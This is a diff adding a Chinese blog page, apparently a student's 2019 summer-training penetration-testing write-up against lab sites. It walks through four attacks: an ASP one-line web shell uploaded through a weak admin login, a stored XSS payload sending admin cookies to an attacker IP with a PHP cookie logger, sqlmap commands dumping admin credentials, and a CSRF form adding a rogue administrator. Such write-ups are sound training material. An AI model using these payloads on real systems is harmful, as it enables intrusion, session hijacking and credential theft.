@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Regenbogenlj">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Regenbogenlj">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="记录一个小白的成长">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>暑假实训实战总结 · RegenbogenLJ&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.jpg">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >RegenbogenLJ&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">暑假实训实战总结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>RegenbogenLJ's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            暑假实训实战总结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">828</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/07/12</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="实战总结"><a href="#实战总结" class="headerlink" title="实战总结"></a>实战总结</h1><h2 id="紫帽中心小学：上传漏洞"><a href="#紫帽中心小学：上传漏洞" class="headerlink" title="紫帽中心小学：上传漏洞"></a>紫帽中心小学：上传漏洞</h2><h3 id="1-进入网站"><a href="#1-进入网站" class="headerlink" title="1.进入网站"></a>1.进入网站</h3><p>网站功能正常可以使用。<br>​​<img src="/images/2019-7-12/1.png" alt> </p>
+<p>​​<img src="/images/2019-7-12/2.png" alt></p>
+<h3 id="2-尝试登录后台，发现账号密码太弱，-账号密码为：admin-admin008"><a href="#2-尝试登录后台，发现账号密码太弱，-账号密码为：admin-admin008" class="headerlink" title="2.尝试登录后台，发现账号密码太弱， 账号密码为：admin/admin008"></a>2.尝试登录后台，发现账号密码太弱， 账号密码为：admin/admin008</h3><p>​​​​<img src="/images/2019-7-12/3.png" alt></p>
+<p>发现可以上传点<br>​​​​<img src="/images/2019-7-12/4.png" alt></p>
+<p>先传一个正常的图片，正常上传。<br>​​​​<img src="/images/2019-7-12/5.png" alt></p>
+<p>​​​​<img src="/images/2019-7-12/6.png" alt></p>
+<h3 id="3-小马的制作"><a href="#3-小马的制作" class="headerlink" title="3.小马的制作"></a>3.小马的制作</h3><p>修改图片的属性，标题和主题的内容为&lt;%eval request(“pass”)%&gt;<br>​​​​<img src="/images/2019-7-12/7.png" alt> </p>
+<h3 id="4-上传小马"><a href="#4-上传小马" class="headerlink" title="4.上传小马"></a>4.上传小马</h3><p>选择链接图片，成功上传木马图片。<br>​​​​<img src="/images/2019-7-12/8.png" alt></p>
+<p>​​​​<img src="/images/2019-7-12/9.png" alt></p>
+<p>​​​​<img src="/images/2019-7-12/10.png" alt></p>
+<p>点击查看按钮，页面跳转，内容显示为乱码，如图<br>​​​​<img src="/images/2019-7-12/11.png" alt></p>
+<h3 id="5-菜刀连接"><a href="#5-菜刀连接" class="headerlink" title="5.菜刀连接"></a>5.菜刀连接</h3><p>右键添加连接网站，网址为：<br><code>http://192.168.26.129/admin/UploadFile/pic/201971215222565533711.asp;.jpg</code></p>
+<p>​​​​<img src="/images/2019-7-12/12.png" alt></p>
+<p>​​​​<img src="/images/2019-7-12/13.png" alt></p>
+<p>连接成功后即可查看网站的目录文件。</p>
+<h3 id="6-上传大马"><a href="#6-上传大马" class="headerlink" title="6.上传大马"></a>6.上传大马</h3><p>​​​​<img src="/images/2019-7-12/14.png" alt></p>
+<h3 id="7-访问木马网页并登录"><a href="#7-访问木马网页并登录" class="headerlink" title="7.访问木马网页并登录"></a>7.访问木马网页并登录</h3><p>​​​​<img src="/images/2019-7-12/15.png" alt></p>
+<p>​​​​<img src="/images/2019-7-12/16.png" alt></p>
+<p>登录成功后，发现根本没有权限，尝试用kali爆，但是没有成功。</p>
+<h2 id="海河工作室xss漏洞可获取超级管理员权限"><a href="#海河工作室xss漏洞可获取超级管理员权限" class="headerlink" title="海河工作室xss漏洞可获取超级管理员权限"></a>海河工作室xss漏洞可获取超级管理员权限</h2><h3 id="1-进入网站-1"><a href="#1-进入网站-1" class="headerlink" title="1.进入网站"></a>1.进入网站</h3><p>网站可以正常访问，如图所示，后台登录也很正常。<br>​​​​<img src="/images/2019-7-12/17.png" alt></p>
+<h3 id="2-留言板输入脚本"><a href="#2-留言板输入脚本" class="headerlink" title="2.留言板输入脚本"></a>2.留言板输入脚本</h3><p>脚本内容如下：<br><code>&lt;script&gt;document.location=&#39;http://192.168.65.100/cookie.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p>
+<p>​​​​<img src="/images/2019-7-12/18.png" alt><br>此脚本是为了管理员查看留言时自动获取cookie。其中Ip地址为攻击机，并且在攻击机中写一个cookie.php,内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($log,$cookie .<span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"done"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>获取的cookie值会保存在cookie.txt文件中。</p>
+<h3 id="3-登录后台admin进入后查看新留言。"><a href="#3-登录后台admin进入后查看新留言。" class="headerlink" title="3.登录后台admin进入后查看新留言。"></a>3.登录后台admin进入后查看新留言。</h3><p>发现done执行成功。<br>​​​​<img src="/images/2019-7-12/19.png" alt></p>
+<h3 id="4-进入攻击机kali"><a href="#4-进入攻击机kali" class="headerlink" title="4.进入攻击机kali"></a>4.进入攻击机kali</h3><p>开启apache2 ，命令如下：<br><code>systemctl start apache2</code><br>还有要给cookie.txt写入的权限。命令：<br><code>chmod 777 -Rf html/</code><br>后台查看留言后会自动出现cookie.txt，成功后，查看cookie.txt内容会看到cookie。<br>​​​​<img src="/images/2019-7-12/20.png" alt></p>
+<h3 id="5-进入网站后台"><a href="#5-进入网站后台" class="headerlink" title="5.进入网站后台"></a>5.进入网站后台</h3><p>右键“检查”—“application”—修改cookie，刷新网页，即可成功进入后台。如下图：<br>​​​​<img src="/images/2019-7-12/21.png" alt><br>​​<img src="/images/2019-7-12/22.png" alt><br>​​</p>
+<h2 id="hubmb网某处SQL注入导致管理员账号密码泄露"><a href="#hubmb网某处SQL注入导致管理员账号密码泄露" class="headerlink" title="hubmb网某处SQL注入导致管理员账号密码泄露"></a>hubmb网某处SQL注入导致管理员账号密码泄露</h2><h3 id="1-进入网页"><a href="#1-进入网页" class="headerlink" title="1.进入网页"></a>1.进入网页</h3><p>网页正常访问，后台也正常。<br>​​​​<img src="/images/2019-7-12/23.png" alt></p>
+<h3 id="2-观察URL，尝试SQL注入成功"><a href="#2-观察URL，尝试SQL注入成功" class="headerlink" title="2.观察URL，尝试SQL注入成功"></a>2.观察URL，尝试SQL注入成功</h3><p><code>http://192.168.222.69:81/ArticleRead.asp?id=777</code><br>​​​​<img src="/images/2019-7-12/24.png" alt></p>
+<h3 id="3-尝试用sqlmap爆库"><a href="#3-尝试用sqlmap爆库" class="headerlink" title="3.尝试用sqlmap爆库"></a>3.尝试用sqlmap爆库</h3><p><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –-dbs</code><br>结果如图：<br>​​​​<img src="/images/2019-7-12/25.png" alt><br>猜测<br><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D user –table</code><br>发现没有这个数据库，继续利用sqlmap进行图中操作，得到数据库名和表名，结果如图：<br>​​​​<img src="/images/2019-7-12/26.png" alt><br><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D Microsoft_Access_masterdb –T admin –column</code><br> 自动探测出user表中的信息，结果如图：<br>​​​​<img src="/images/2019-7-12/27.png" alt><br><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D Microsoft_Access_masterdb –T admin –C user_id,user_pwd –dump</code><br> 可自动探测出用户名和密码内容，结果如图：<br>​​​​<img src="/images/2019-7-12/28.png" alt><br>获取到后台账号密码就可以登录后台了。</p>
+<h2 id="大连网站建设：CSRF漏洞"><a href="#大连网站建设：CSRF漏洞" class="headerlink" title="大连网站建设：CSRF漏洞"></a>大连网站建设：CSRF漏洞</h2><h3 id="1-进入网站-2"><a href="#1-进入网站-2" class="headerlink" title="1.进入网站"></a>1.进入网站</h3><p>输入IP地址，显示网站可正常访问，主页如图。<br>​​​​<img src="/images/2019-7-12/29.png" alt></p>
+<p>管理登录界面，使用后台功能。<br>​​​​<img src="/images/2019-7-12/30.png" alt></p>
+<p>​​​​<img src="/images/2019-7-12/31.png" alt></p>
+<p>​​​​<img src="/images/2019-7-12/32.png" alt></p>
+<p>​​​<img src="/images/2019-7-12/33.png" alt></p>
+<p>​​​​<img src="/images/2019-7-12/34.png" alt></p>
+<p>以上功能全部可正常使用。</p>
+<h3 id="2-登录后台，查看页面框架源代码。"><a href="#2-登录后台，查看页面框架源代码。" class="headerlink" title="2.登录后台，查看页面框架源代码。"></a>2.登录后台，查看页面框架源代码。</h3><p>发现form标签，修改标签并添加URL,如下图。<br>​​ ​​<img src="/images/2019-7-12/36.png" alt></p>
+<h3 id="3-向网站中添加非法管理员"><a href="#3-向网站中添加非法管理员" class="headerlink" title="3.向网站中添加非法管理员"></a>3.向网站中添加非法管理员</h3><p>将home.txt改为home.html，并双击打开，界面如下图，并向网站中添加非法管理员。<br>​​​​<img src="/images/2019-7-12/37.png" alt></p>
+<p>​​​​<img src="/images/2019-7-12/38.png" alt></p>
+<p>成为管理员，获取管理员权限。<br>​​​​<img src="/images/2019-7-12/38.png" alt></p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/07/12/hello-world/" title= "Hello World">
+                    <div class="prevTitle">Hello World</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1476869311@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Regenbogenlj" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#实战总结"><span class="toc-number">1.</span> <span class="toc-text">实战总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#紫帽中心小学：上传漏洞"><span class="toc-number">1.1.</span> <span class="toc-text">紫帽中心小学：上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-进入网站"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.进入网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-尝试登录后台，发现账号密码太弱，-账号密码为：admin-admin008"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.尝试登录后台，发现账号密码太弱， 账号密码为：admin/admin008</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-小马的制作"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.小马的制作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-上传小马"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.上传小马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-菜刀连接"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.菜刀连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-上传大马"><span class="toc-number">1.1.6.</span> <span class="toc-text">6.上传大马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-访问木马网页并登录"><span class="toc-number">1.1.7.</span> <span class="toc-text">7.访问木马网页并登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#海河工作室xss漏洞可获取超级管理员权限"><span class="toc-number">1.2.</span> <span class="toc-text">海河工作室xss漏洞可获取超级管理员权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-进入网站-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.进入网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-留言板输入脚本"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.留言板输入脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-登录后台admin进入后查看新留言。"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.登录后台admin进入后查看新留言。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-进入攻击机kali"><span class="toc-number">1.2.4.</span> <span class="toc-text">4.进入攻击机kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-进入网站后台"><span class="toc-number">1.2.5.</span> <span class="toc-text">5.进入网站后台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hubmb网某处SQL注入导致管理员账号密码泄露"><span class="toc-number">1.3.</span> <span class="toc-text">hubmb网某处SQL注入导致管理员账号密码泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-进入网页"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.进入网页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-观察URL，尝试SQL注入成功"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.观察URL，尝试SQL注入成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-尝试用sqlmap爆库"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.尝试用sqlmap爆库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大连网站建设：CSRF漏洞"><span class="toc-number">1.4.</span> <span class="toc-text">大连网站建设：CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-进入网站-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.进入网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-登录后台，查看页面框架源代码。"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.登录后台，查看页面框架源代码。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-向网站中添加非法管理员"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.向网站中添加非法管理员</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 11
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2019/07/12/实训实战总结/" >暑假实训实战总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2019/07/12/hello-world/" >Hello World</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2019/07/04/综合实验/" >综合实验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/03</span><a class="archive-post-title" href= "/2019/07/03/静态路由实验/" >静态路由实验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/03</span><a class="archive-post-title" href= "/2019/07/03/三层交换实验/" >三层交换实验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/2019/07/02/IRF、聚合实验/" >IRF、聚合实验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/2019/07/02/VLAN实验/" >VLAN 实验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2019/06/18/Hexo-Github搭建个人博客/" >Hexo+Github搭建个人博客</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2019/06/18/photos/" >photos</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2019/06/16/world/" >world</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2019/06/16/test/" >test</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="blog"><span class="iconfont-archer">&#xe606;</span>blog</span>
+    
+        <span class="sidebar-tag-name" data-tags="交换机"><span class="iconfont-archer">&#xe606;</span>交换机</span>
+    
